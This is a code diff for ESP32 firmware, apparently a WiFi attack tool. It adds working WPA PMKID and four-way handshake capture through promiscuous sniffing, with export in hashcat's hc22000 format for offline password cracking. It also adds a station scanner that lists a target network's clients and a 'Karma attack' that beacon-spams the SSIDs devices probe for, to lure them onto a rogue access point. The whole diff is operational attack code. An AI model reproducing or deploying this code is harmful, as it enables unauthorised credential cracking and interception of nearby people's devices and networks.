@@ -126,6 +126,232 @@ static String rogueSsid = "";
 // -------- SSID Message --------
 static bool ssidMsgActive = false;
 
+// -------- PMKID / Handshake capture --------
+struct HandshakeCapture {
+  String bssid;     // AP MAC (AA:BB:CC:DD:EE:FF)
+  String client;    // Station MAC
+  String ssid;
+  uint8_t pmkid[16];
+  bool    hasPmkid = false;
+  uint8_t anonce[32];
+  bool    hasAnonce = false;
+  uint8_t snonce[32];
+  uint8_t mic[16];
+  uint8_t eapol[256]; // raw EAPOL msg2
+  uint16_t eapolLen = 0;
+  bool    hasHandshake = false; // true when msg1+msg2 captured
+  uint32_t ts;
+};
+static std::vector<HandshakeCapture> handshakes;
+static bool handshakeActive = false;
+static uint8_t hsTargetBssid[6] = {};
+static String  hsTargetSsid;
+static uint8_t hsChannel = 1;
+
+static String macToHex(const uint8_t* m) {
+  char buf[13];
+  snprintf(buf, sizeof(buf), "%02x%02x%02x%02x%02x%02x",
+    m[0], m[1], m[2], m[3], m[4], m[5]);
+  return String(buf);
+}
+static String macToStr(const uint8_t* m) {
+  char buf[18];
+  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
+    m[0], m[1], m[2], m[3], m[4], m[5]);
+  return String(buf);
+}
+static String bytesToHex(const uint8_t* b, int len) {
+  String s;
+  s.reserve(len * 2);
+  char h[3];
+  for (int i = 0; i < len; i++) { snprintf(h, 3, "%02x", b[i]); s += h; }
+  return s;
+}
+
+static HandshakeCapture* findOrAddCapture(const uint8_t* ap, const uint8_t* sta) {
+  String bssid = macToStr(ap);
+  String client = macToStr(sta);
+  for (auto& c : handshakes) {
+    if (c.bssid == bssid && c.client == client) return &c;
+  }
+  if (handshakes.size() >= 32) return nullptr;
+  HandshakeCapture c;
+  c.bssid = bssid; c.client = client; c.ssid = hsTargetSsid; c.ts = millis();
+  handshakes.push_back(c);
+  return &handshakes.back();
+}
+
+static void IRAM_ATTR eapolPromisc(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
+  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+  const uint8_t* fc = pkt->payload;
+  uint16_t len = pkt->rx_ctrl.sig_len;
+  if (len < 30) return;
+
+  uint8_t ftype = (fc[0] & 0x0C) >> 2;
+  if (ftype != 2) return; // data frames only
+
+  bool toDS   = (fc[1] & 0x01) != 0;
+  bool fromDS = (fc[1] & 0x02) != 0;
+  if (toDS == fromDS) return; // WDS or IBSS — skip
+
+  // Extract AP (BSSID) and Station addresses
+  // ToDS=1,FromDS=0: addr1=BSSID, addr2=SA(sta), addr3=DA
+  // ToDS=0,FromDS=1: addr1=DA(sta), addr2=BSSID, addr3=SA
+  const uint8_t* ap  = fromDS ? fc + 10 : fc + 4;  // addr2 or addr1
+  const uint8_t* sta = fromDS ? fc + 4  : fc + 10; // addr1 or addr2
+
+  // Only process frames involving our target BSSID
+  if (memcmp(ap, hsTargetBssid, 6) != 0) return;
+
+  // Skip multicast/broadcast stations
+  if (sta[0] & 0x01) return;
+
+  // QoS data frames have 2 extra bytes before LLC
+  bool isQos = (fc[0] & 0xF0) == 0x80;
+  uint16_t hdrLen = 24 + (isQos ? 2 : 0);
+  if (len < (uint16_t)(hdrLen + 8 + 4)) return;
+
+  // LLC/SNAP: AA AA 03 00 00 00 88 8E
+  const uint8_t* llc = fc + hdrLen;
+  if (llc[0] != 0xAA || llc[1] != 0xAA || llc[6] != 0x88 || llc[7] != 0x8E) return;
+
+  // EAPOL header
+  const uint8_t* eapol = llc + 8;
+  uint16_t eapolRem = len - hdrLen - 8;
+  if (eapolRem < 4) return;
+  if (eapol[1] != 0x03) return; // not EAPOL-Key
+
+  uint16_t bodyLen = ((uint16_t)eapol[2] << 8) | eapol[3];
+  if (bodyLen < 95 || eapolRem < (uint16_t)(4 + bodyLen)) return;
+
+  const uint8_t* key = eapol + 4;
+  if (key[0] != 0x02) return; // must be RSN descriptor
+
+  uint16_t keyInfo = ((uint16_t)key[1] << 8) | key[2];
+  bool ack     = (keyInfo >> 7) & 1;
+  bool hasMic  = (keyInfo >> 8) & 1;
+  bool install = (keyInfo >> 6) & 1;
+  bool secure  = (keyInfo >> 9) & 1;
+
+  // Message 1: Ack=1, MIC=0, Install=0, Secure=0
+  // Message 2: Ack=0, MIC=1, Install=0, Secure=0
+  bool isMsg1 = (ack && !hasMic && !install && !secure);
+  bool isMsg2 = (!ack && hasMic && !install && !secure);
+  if (!isMsg1 && !isMsg2) return;
+
+  // ANonce is at key[13..44]
+  const uint8_t* nonce = key + 13;
+  uint16_t keyDataLen = ((uint16_t)key[81] << 8) | key[82];
+  const uint8_t* keyData = key + 83;
+
+  HandshakeCapture* cap = findOrAddCapture(ap, sta);
+  if (!cap) return;
+
+  if (isMsg1) {
+    memcpy(cap->anonce, nonce, 32);
+    cap->hasAnonce = true;
+    cap->ts = millis();
+
+    // Hunt for PMKID KDE: DD 16 00 0F AC 04 [16 bytes]
+    for (uint16_t i = 0; i + 22 <= keyDataLen; i++) {
+      if (keyData[i] == 0xDD && keyData[i+1] == 0x16 &&
+          keyData[i+2] == 0x00 && keyData[i+3] == 0x0F &&
+          keyData[i+4] == 0xAC && keyData[i+5] == 0x04) {
+        memcpy(cap->pmkid, keyData + i + 6, 16);
+        cap->hasPmkid = true;
+        Activity::log("alert", "PMKID captured from " + cap->bssid);
+        break;
+      }
+    }
+  }
+
+  if (isMsg2 && cap->hasAnonce) {
+    memcpy(cap->snonce, nonce, 32);
+    memcpy(cap->mic, key + 65, 16);
+    // Store raw EAPOL msg2 (capped at 256 bytes)
+    uint16_t copyLen = min((uint16_t)256, (uint16_t)(4 + bodyLen));
+    memcpy(cap->eapol, eapol, copyLen);
+    cap->eapolLen = copyLen;
+    cap->hasHandshake = true;
+    Activity::log("alert", "Handshake captured from " + cap->bssid + " / " + cap->client);
+  }
+}
+
+// -------- Station scanner --------
+struct StationEntry {
+  String mac;
+  int8_t rssi;
+  uint32_t lastSeen;
+  uint32_t frames;
+};
+static std::vector<StationEntry> stations;
+static bool stationActive = false;
+static uint8_t stationTargetBssid[6] = {};
+static uint8_t stationChannel = 1;
+
+static void IRAM_ATTR stationPromisc(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (type != WIFI_PKT_DATA) return;
+  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+  const uint8_t* fc = pkt->payload;
+  uint16_t len = pkt->rx_ctrl.sig_len;
+  if (len < 24) return;
+
+  uint8_t ftype = (fc[0] & 0x0C) >> 2;
+  if (ftype != 2) return;
+
+  bool toDS   = (fc[1] & 0x01) != 0;
+  bool fromDS = (fc[1] & 0x02) != 0;
+
+  const uint8_t* bssid = nullptr;
+  const uint8_t* sta   = nullptr;
+  if (toDS && !fromDS)  { bssid = fc + 4;  sta = fc + 10; }
+  if (!toDS && fromDS)  { bssid = fc + 10; sta = fc + 4;  }
+  if (!bssid) return;
+  if (memcmp(bssid, stationTargetBssid, 6) != 0) return;
+  if (sta[0] & 0x01) return; // skip multicast
+
+  char macStr[18];
+  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+    sta[0], sta[1], sta[2], sta[3], sta[4], sta[5]);
+  String mac(macStr);
+
+  for (auto& e : stations) {
+    if (e.mac == mac) {
+      e.rssi = pkt->rx_ctrl.rssi;
+      e.lastSeen = millis();
+      e.frames++;
+      return;
+    }
+  }
+  if (stations.size() < 64) {
+    stations.push_back({mac, (int8_t)pkt->rx_ctrl.rssi, millis(), 1});
+  }
+}
+
+// -------- Karma attack --------
+static bool karmaActive = false;
+static std::vector<String> karmaLearnedSsids;
+static unsigned long karmaBeaconLast = 0;
+static int karmaBeaconIdx = 0;
+static unsigned long karmaBeaconCount = 0;
+static char   _karmaPending[33] = {};
+static volatile bool _karmaNewFlag = false;
+
+static void IRAM_ATTR karmaPromisc(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (type != WIFI_PKT_MGMT) return;
+  const wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
+  const uint8_t* pl = p->payload;
+  if ((pl[0] & 0xFC) != 0x40) return; // probe request only
+  if (pl[24] != 0x00) return;          // must have SSID IE
+  uint8_t ssidLen = pl[25];
+  if (ssidLen == 0 || ssidLen > 32) return; // skip null probes
+  if (_karmaNewFlag) return; // drop if main loop hasn't consumed yet
+  memset(_karmaPending, 0, sizeof(_karmaPending));
+  memcpy(_karmaPending, pl + 26, ssidLen);
+  _karmaNewFlag = true;
+}
+
 // -------- TX power --------
 static int currentTxDbm = 20;
 
@@ -600,6 +826,193 @@ void randomizeMac() {
   snprintf(s, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
     mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
   Activity::log("info", "MAC randomized: " + String(s));
+}
+
+// ---------------------------------------------------------------- Handshake capture
+void startHandshake(const JsonDocument& params) {
+  handshakes.clear();
+  handshakeActive = true;
+  hsTargetSsid = String((const char*)(params["ssid"] | ""));
+  hsChannel    = params["channel"] | 1;
+  String bssid = String((const char*)(params["bssid"] | ""));
+  int v[6] = {};
+  sscanf(bssid.c_str(), "%x:%x:%x:%x:%x:%x",
+    &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]);
+  for (int i = 0; i < 6; i++) hsTargetBssid[i] = v[i];
+
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_channel(hsChannel, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_promiscuous_rx_cb(&eapolPromisc);
+  Activity::log("scan", "Handshake capture: ch" + String(hsChannel) + " " + bssid);
+}
+
+void stopHandshake() {
+  if (!handshakeActive) return;
+  handshakeActive = false;
+  esp_wifi_set_promiscuous(false);
+}
+
+void tickHandshake() {} // all work done in IRAM callback
+
+String handshakeJson() {
+  JsonDocument doc;
+  JsonArray arr = doc.to<JsonArray>();
+  for (auto& c : handshakes) {
+    JsonObject o = arr.add<JsonObject>();
+    o["bssid"]    = c.bssid;
+    o["client"]   = c.client;
+    o["ssid"]     = c.ssid;
+    o["pmkid"]    = c.hasPmkid    ? bytesToHex(c.pmkid, 16)   : String("");
+    o["hs"]       = c.hasHandshake;
+    o["ts"]       = c.ts;
+  }
+  String out; serializeJson(doc, out); return out;
+}
+
+String handshakeHc22000() {
+  String out;
+  for (auto& c : handshakes) {
+    String bssidHex   = c.bssid;  bssidHex.replace(":", "");  bssidHex.toLowerCase();
+    String clientHex  = c.client; clientHex.replace(":", ""); clientHex.toLowerCase();
+    String ssidHex;
+    for (size_t i = 0; i < c.ssid.length(); i++) {
+      char h[3]; snprintf(h, 3, "%02x", (uint8_t)c.ssid[i]); ssidHex += h;
+    }
+    if (c.hasPmkid) {
+      out += "WPA*01*" + bytesToHex(c.pmkid, 16) + "*" +
+             bssidHex + "*" + clientHex + "*" + ssidHex + "**\n";
+    }
+    if (c.hasHandshake) {
+      // Zero out MIC in stored EAPOL for hashcat format
+      uint8_t eapolCopy[256];
+      memcpy(eapolCopy, c.eapol, c.eapolLen);
+      if (c.eapolLen >= 4 + 65 + 16) memset(eapolCopy + 4 + 65, 0, 16);
+      out += "WPA*02*" + bytesToHex(c.mic, 16) + "*" +
+             bssidHex + "*" + clientHex + "*" + ssidHex + "*" +
+             bytesToHex(c.anonce, 32) + "*" +
+             bytesToHex(eapolCopy, c.eapolLen) + "*00\n";
+    }
+  }
+  return out;
+}
+
+void fillHandshakeStatus(JsonDocument& doc) {
+  int pmkids = 0, hs = 0;
+  for (auto& c : handshakes) {
+    if (c.hasPmkid) pmkids++;
+    if (c.hasHandshake) hs++;
+  }
+  doc["pmkids"] = pmkids;
+  doc["handshakes"] = hs;
+  doc["total"] = (int)handshakes.size();
+}
+
+// ---------------------------------------------------------------- Station scanner
+void startStationScan(const JsonDocument& params) {
+  stations.clear();
+  stationActive = true;
+  stationChannel = params["channel"] | 1;
+  String bssid = String((const char*)(params["bssid"] | ""));
+  int v[6] = {};
+  sscanf(bssid.c_str(), "%x:%x:%x:%x:%x:%x",
+    &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]);
+  for (int i = 0; i < 6; i++) stationTargetBssid[i] = v[i];
+
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_channel(stationChannel, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_promiscuous_filter(nullptr); // all traffic
+  esp_wifi_set_promiscuous_rx_cb(&stationPromisc);
+  Activity::log("scan", "Station scan: ch" + String(stationChannel) + " " + bssid);
+}
+
+void stopStationScan() {
+  if (!stationActive) return;
+  stationActive = false;
+  esp_wifi_set_promiscuous(false);
+}
+
+String stationScanJson() {
+  JsonDocument doc;
+  JsonArray arr = doc.to<JsonArray>();
+  for (auto& e : stations) {
+    JsonObject o = arr.add<JsonObject>();
+    o["mac"]  = e.mac;
+    o["rssi"] = e.rssi;
+    o["frames"] = e.frames;
+    o["ts"] = e.lastSeen;
+  }
+  String out; serializeJson(doc, out); return out;
+}
+
+void fillStationStatus(JsonDocument& doc) {
+  doc["count"] = (int)stations.size();
+}
+
+// ---------------------------------------------------------------- Karma attack
+void startKarma() {
+  karmaLearnedSsids.clear();
+  karmaBeaconCount = 0;
+  karmaBeaconIdx = 0;
+  karmaActive = true;
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(&karmaPromisc);
+  Activity::log("spam", "Karma attack started");
+}
+
+void stopKarma() {
+  if (!karmaActive) return;
+  karmaActive = false;
+  esp_wifi_set_promiscuous(false);
+  beaconActive = false;
+}
+
+void tickKarma() {
+  if (!karmaActive) return;
+
+  // Drain the ISR pending buffer on the main loop (Core 1 — safe for std::vector)
+  if (_karmaNewFlag) {
+    _karmaNewFlag = false;
+    String ssid(_karmaPending);
+    bool found = false;
+    for (auto& s : karmaLearnedSsids) if (s == ssid) { found = true; break; }
+    if (!found && karmaLearnedSsids.size() < 64) {
+      karmaLearnedSsids.push_back(ssid);
+      Activity::log("info", "Karma: learned " + ssid);
+    }
+  }
+
+  if (karmaLearnedSsids.empty()) return;
+
+  // Beacon-spam all learned SSIDs
+  if (millis() - karmaBeaconLast < 30) return;
+  karmaBeaconLast = millis();
+
+  String ssid = karmaLearnedSsids[karmaBeaconIdx % karmaLearnedSsids.size()];
+  karmaBeaconIdx++;
+
+  beaconFrame[37] = ssid.length();
+  for (size_t i = 0; i < ssid.length() && i < 32; i++)
+    beaconFrame[38 + i] = ssid[i];
+  uint32_t h = 0;
+  for (size_t i = 0; i < ssid.length(); i++) h = h * 31 + ssid[i];
+  beaconFrame[10]=beaconFrame[16]=0x4A;
+  beaconFrame[11]=beaconFrame[17]=0xC9;
+  beaconFrame[12]=beaconFrame[18]=0x4F;
+  beaconFrame[13]=beaconFrame[19]=(h>>16)&0xFF;
+  beaconFrame[14]=beaconFrame[20]=(h>>8)&0xFF;
+  beaconFrame[15]=beaconFrame[21]=h&0xFF;
+  size_t tailStart = 38 + ssid.length();
+  memcpy(beaconFrame + tailStart, beaconFrameTail, sizeof(beaconFrameTail));
+  beaconFrame[tailStart + sizeof(beaconFrameTail) - 1] = 6; // ch6
+  esp_wifi_80211_tx(WIFI_IF_AP, beaconFrame, tailStart + sizeof(beaconFrameTail), false);
+  karmaBeaconCount++;
+}
+
+void fillKarmaStatus(JsonDocument& doc) {
+  doc["learned"] = (int)karmaLearnedSsids.size();
+  doc["beacons"] = (uint32_t)karmaBeaconCount;
+  auto arr = doc["karma_ssids"].to<JsonArray>();
+  for (auto& s : karmaLearnedSsids) arr.add(s);
 }
 
 // ---------------------------------------------------------------- Clear
